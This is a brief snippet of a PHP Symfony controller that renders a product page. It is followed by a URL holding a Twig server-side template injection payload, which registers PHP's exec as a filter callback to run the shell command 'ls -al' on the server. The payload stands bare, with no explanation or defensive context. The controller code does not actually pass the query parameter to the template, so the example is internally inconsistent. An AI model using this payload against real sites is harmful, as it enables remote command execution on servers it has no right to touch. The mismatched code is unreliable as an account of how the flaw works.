source code:

```
public function showAction($productId) {
    $product = $this->getDoctrine()
        ->getRepository(Product::class)
        ->find($productId);

    $template = "
        <html>
            <body>
                <h1>{{ page }}</h1>
                <h2>{{ product.name }}</h2>
                <p>{{ product.description }}</p>
                <p>Price: {{ product.price }}</p>
            </body>
        </html>
    ";

    return $this->render('product/show.html.twig', array(
        'product' => $product,
        'page' => 'Product Detail',
        'template' => $template
    ));
}
```

```http://localhost:8000/product/1?template={{ _self.env.registerUndefinedFilterCallback('exec') }}{{ _self.env.getFilter('id')|exec('ls -al') }}```
